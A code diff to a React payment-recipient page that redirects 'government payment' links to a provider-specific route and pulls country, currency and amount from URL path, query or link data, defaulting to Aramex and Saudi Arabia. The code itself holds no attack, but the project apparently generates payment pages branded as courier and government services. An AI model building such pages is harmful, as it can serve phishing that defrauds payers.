@@ -29,6 +29,19 @@ const PaymentRecipient = () => {
   const [residentialAddress, setResidentialAddress] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
+  // Check if this is a government payment service
+  const isGovernmentPayment = linkData?.type === 'government_payment' || linkData?.payload?.provider;
+  const governmentProvider = linkData?.payload?.provider || linkData?.payload?.service_key;
+
+  // If government payment, redirect to proper page
+  useEffect(() => {
+    if (!isLoading && isGovernmentPayment && governmentProvider && id) {
+      const redirectUrl = `/gov/${governmentProvider}/${id}?provider=${governmentProvider}&country=${linkData?.payload?.selectedCountry || linkData?.country_code || 'SA'}`;
+      console.log('Redirecting to government payment page:', redirectUrl);
+      navigate(redirectUrl);
+    }
+  }, [isLoading, isGovernmentPayment, governmentProvider, id, linkData, navigate]);
+
   const urlParams = new URLSearchParams(window.location.search);
   // دعم Path Parameters + Query Parameters (backward compatible)
   const serviceKey = pathCompany || urlParams.get('company') || urlParams.get('c') || linkData?.payload?.service_key || urlParams.get('service') || 'aramex';
@@ -47,12 +60,15 @@ const PaymentRecipient = () => {
 
   const shippingInfo = linkData?.payload as Record<string, unknown>;
   const payerType = shippingInfo?.payer_type || "recipient";
-  const countryCode = shippingInfo?.selectedCountry || "SA";
+  const countryCode = shippingInfo?.selectedCountry || linkData?.country_code || "SA";
   const countryData = getCountryByCode(countryCode);
   const phoneCode = countryData?.phoneCode || "+966";
-  const currencyCode = currencyParam || countryData?.currency || "SAR";
+  
+  // Priority: path params > query params > linkData > defaults
+  const currencyCode = pathCurrency || currencyParam || shippingInfo?.currency_code || countryData?.currency || "SAR";
 
-  const rawAmount = amountParam || shippingInfo?.cod_amount;
+  // Get amount from multiple sources with priority
+  const rawAmount = pathAmount || amountParam || shippingInfo?.cod_amount || shippingInfo?.payment_amount;
   let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
     if (typeof rawAmount === 'number') {
